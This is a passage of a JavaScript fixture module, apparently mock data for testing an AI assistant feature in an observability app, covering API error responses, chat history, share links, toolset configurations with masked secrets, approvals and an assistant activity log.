    body: { code: 402, message: "Free trial quota exhausted (500/500 used). Subscribe to continue using this feature." },
  },
  // 429 turn limit (useChatStream.ts:103-108)
  turn_limit: { status: 429, body: { code: 429, error_code: "turn_limit", message: "Too many chats are running. Wait for one to finish." } },
  // WP-03: the request never reaches the server (`networkError`), or each wire shape of `__fixtures__/errors/wire`; `envelope` is the B-01 body (`envelopeEnabled`).
  offline: { networkError: true },
  unauthorized_401: { status: 401, body: { code: 401, message: "Unauthorized Access" }, envelope: { code: "session_expired", message: "Session expired", retryable: false } },
  forbidden_403: { status: 403, body: { code: 403, message: "Unauthorized Access" }, envelope: { code: "permission_denied", message: "Forbidden", retryable: false, action: "ask_admin" } },
  not_enabled_400: { status: 400, body: { code: 400, message: "AI is not enabled" }, envelope: { code: "not_enabled", message: "AI is not enabled", retryable: false, action: "ask_admin" } },
  lease_409: { status: 409, body: { code: 409, message: "Another turn is already running in this conversation" }, envelope: { code: "turn_busy", message: "Another turn is already running", retryable: false, action: "none", active_turn_id: "0199e7b2-7000-7a3e-a1b2-c3d4e5f60799" } },
  already_submitted_409: { status: 409, body: { code: 409, message: "This turn was already submitted; reload the conversation to see its result" }, envelope: { code: "already_submitted", message: "Already submitted", retryable: false, action: "reload" } },
  upstream_429: { status: 429, body: { code: 429, error: "upstream returned 429 Too Many Requests" }, envelope: { code: "rate_limited", message: "Rate limited", retryable: true, retry_after: 30, action: "retry" } },
  agent_503: { status: 503, body: { code: 503, error: "error sending request for url (http://o2-ai:8000/api/v1/chat/stream)" }, envelope: { code: "agent_unavailable", message: "Agent unavailable", retryable: true } },
  authz_503: { status: 503, body: { code: 503, message: "redis connection timed out" }, envelope: { code: "authorization_unavailable", message: "Authorization unavailable", retryable: true } },
  // A member of the org: the consent object says the user cannot manage paid usage.
  consent_member: {
    status: 412,
    body: {
      code: 412,
      message: "Paid usage requires organization consent.",
      error_type: "paid_overage_consent_required",
      consent: overageStatus({ effective: false, billing_status: "eligible", can_manage: false }),
    },
  },
  // The same-turn retry after Enable answers 412 again (consent_still_required).
  consent_twice: {
    status: 412,
    repeat: 2,
    body: {
      code: 412,
      message: "Paid usage requires organization consent.",
      error_type: "paid_overage_consent_required",
      consent: overageStatus({ effective: false, billing_status: "eligible" }),
    },
  },
};

export function overageStatus({ effective = false, billing_status = "eligible", can_manage = true, enabled = false } = {}) {
  return {
    feature: "ai_credits",
    organization: { org_id: "default", enabled, can_manage },
    payer: null,
    effective,
    billing_status,
  };
}

// Chat history (server persistence) and shares.
const H = 3_600_000;
export const CHATS = [
  { title: "Checkout 5xx spike in prod", ago: 0.3 * H, frames: completeFrames(), user: "Why did checkout start throwing 5xx errors in the last 15 minutes?" },
  { title: "PromQL for p95 latency by service", ago: 5 * H, frames: SCENARIOS.promql.frames, user: "Write a PromQL query for p95 latency per service" },
  { title: "VRL to parse nginx logs", ago: 26 * H, frames: SCENARIOS.vrl.frames, user: "Write VRL that parses nginx access logs" },
  { title: "Alert for payment failures", ago: 3 * 24 * H, frames: completeFrames(PROMQL_ANSWER, "Alert for payment failures"), user: "Create an alert when payment failures exceed 5% for 10 minutes" },
  { title: "Slow queries on the orders table", ago: 9 * 24 * H, frames: completeFrames(), user: "Which queries on orders are slow this week?" },
].map((c, i) => {
  const created = NOW - c.ago - 120_000;
  return {
    ...c,
    session_id: uuidv7(created, i + 1),
    created_at: created * US,
    updated_at: (NOW - c.ago) * US,
    last_committed_seq: 12 + i,
  };
});

export function chatSummary(c) {
  return { session_id: c.session_id, title: c.title, created_at: c.created_at, updated_at: c.updated_at, last_committed_seq: c.last_committed_seq };
}

export function chatDetail(c) {
  return {
    ...chatSummary(c),
    not_modified: false,
    state_version: `v${c.last_committed_seq}`,
    active_turn: !!c.running,
    turns: [
      {
        user_message_id: `msg_${c.session_id.slice(-6)}`,
        turn_id: c.turn_id || uuidv7(c.created_at / US + 1000, 99),
        created: c.created_at,
        user: { text: c.user },
        frames: c.running ? [] : c.frames,
        status: c.running ? "running" : "completed",
        first_seq: 1,
        last_seq: c.last_committed_seq,
      },
    ],
  };
}

export const SHARES = [
  {
    id: "shr_01J9X4F7K2",
    token: "tok-live-checkout-5xx",
    url_path: "/web/ai/shared/tok-live-checkout-5xx?org_identifier=default",
    mode: "live",
    visibility: "org",
    snapshot_seq: null,
    expires_at: null,
    created_at: (NOW - 0.2 * H) * US,
    updated_at: (NOW - 0.2 * H) * US,
    access_count: 7,
    last_accessed_at: (NOW - 600_000) * US,
    session_id: CHATS[0].session_id,
    title: CHATS[0].title,
    redact_tools: false,
  },
  {
    id: "shr_01J9X4F7K3",
    token: "tok-public-promql",
    url_path: "/web/ai/public/tok-public-promql",
    mode: "snapshot",
    visibility: "public",
    snapshot_seq: 13,
    expires_at: (NOW + 6 * 24 * H) * US,
    created_at: (NOW - 4 * H) * US,
    updated_at: (NOW - 4 * H) * US,
    access_count: 31,
    last_accessed_at: (NOW - 2 * H) * US,
    session_id: CHATS[1].session_id,
    title: CHATS[1].title,
    redact_tools: true,
  },
  {
    id: "shr_01J9X4F7K4",
    token: "tok-snap-vrl",
    url_path: "/web/ai/shared/tok-snap-vrl?org_identifier=default",
    mode: "snapshot",
    visibility: "org",
    snapshot_seq: 14,
    expires_at: null,
    created_at: (NOW - 25 * H) * US,
    updated_at: (NOW - 25 * H) * US,
    access_count: 2,
    last_accessed_at: (NOW - 20 * H) * US,
    session_id: CHATS[2].session_id,
    title: CHATS[2].title,
    redact_tools: false,
  },
];

export function sharedChat(token) {
  const share = SHARES.find((s) => s.token === token) ?? SHARES[0];
  const chat = CHATS.find((c) => c.session_id === share.session_id) ?? CHATS[0];
  const detail = chatDetail(chat);
  return {
    title: share.title,
    mode: share.mode,
    seq: chat.last_committed_seq,
    state_version: detail.state_version,
    created_at: chat.created_at,
    shared_at: share.created_at,
    owner_name: "Priya Raman",
    redact_tools: share.redact_tools,
    active_turn: false,
    turns: detail.turns.map(({ user_message_id, ...t }) => t),
    not_modified: false,
  };
}

export const TOOLSETS = {
  toolsets: [
    { id: "ts_1", name: "kubectl-readonly", kind: "cli", description: "Read-only kubectl access to prod", created_at: (NOW - 30 * 24 * H) * US, updated_at: (NOW - 2 * 24 * H) * US },
    { id: "ts_2", name: "pagerduty", kind: "mcp", description: "PagerDuty MCP server", created_at: (NOW - 12 * 24 * H) * US, updated_at: (NOW - 12 * 24 * H) * US },
  ],
};

// Full records behind GET /ai/toolsets/{id}; the server returns every stored secret as "***".
export const TOOLSET_RECORDS = {
  ts_1: {
    ...TOOLSETS.toolsets[0],
    data: { command: "kubectl", allowed_subcommands: ["get", "describe", "logs"], requires_confirmation: true, timeout_seconds: 30, max_output_bytes: 100000, env: { KUBE_CONTEXT: "***" }, credential_files: {} },
  },
  ts_2: {
    ...TOOLSETS.toolsets[1],
    data: { url: "https://mcp.pagerduty.example/mcp", timeout_seconds: 30, headers: { Authorization: "***" } },
  },
};

// Health fields per toolset, merged into the list while `toolsetHealthEnabled` is on.
export const TOOLSET_HEALTH = {
  ts_1: { enabled: true, status: { state: "ok", since: (NOW - 2 * H) * US }, last_used_at: (NOW - 2 * H) * US },
  ts_2: { enabled: true, status: { state: "failing", since: (NOW - 3 * H) * US, last_error: "The MCP server refused the credentials." }, last_used_at: (NOW - 3 * H) * US },
};

// Standing approvals.
export const GRANTS = [
  { id: "gr_1", tool: "kubectl-readonly", operation: "logs", scope: "always", granted_by: "root@example.com", granted_at: (NOW - 26 * H) * US },
  { id: "gr_2", tool: "pagerduty", operation: "acknowledge", scope: "chat", chat_id: "chat_1", granted_by: "priya@example.com", granted_at: (NOW - 4 * H) * US },
];

// Assistant activity, newest first.
export const ACTIVITY = {
  rows: [
    { id: "act_1", at: (NOW - 1 * H) * US, action: "Created alert", target: { type: "alert", id: "a1", name: "Checkout 5xx", link: "/alerts", deleted: false }, on_behalf_of: "root@example.com", approval: { kind: "approved", by: "root@example.com" }, result: { state: "done" }, undo: { available: true, until: (NOW + 23 * H) * US }, chat_id: "chat_1" },
    { id: "act_2", at: (NOW - 5 * H) * US, action: "Updated dashboard", target: { type: "dashboard", id: "d1", name: "Turn health", deleted: true }, on_behalf_of: "priya@example.com", approval: { kind: "standing" }, result: { state: "failed", message: "The dashboard changed since." }, undo: { available: false, reason: "unsupported" } },
  ],
};
